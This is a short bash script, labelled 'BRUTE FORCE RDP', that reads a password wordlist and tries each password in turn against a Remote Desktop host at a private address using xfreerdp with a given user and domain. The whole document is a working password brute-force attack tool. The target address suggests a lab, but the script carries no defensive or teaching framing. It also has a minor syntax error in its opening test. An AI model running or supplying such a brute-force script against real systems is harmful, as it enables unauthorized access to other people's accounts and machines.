#!/bin/bash
if [ "$1" == ""]
then
echo " BRUTE FORCE RDP"
echo "$0 User Domain wordlist.txt"
else
for pass in $(cat $3);
do
echo "Testing Password: $pass"
xfreerdp /u:$1 /d:$2 /p:$pass /v:172.16.1.60 /w:800 /h:600;
done


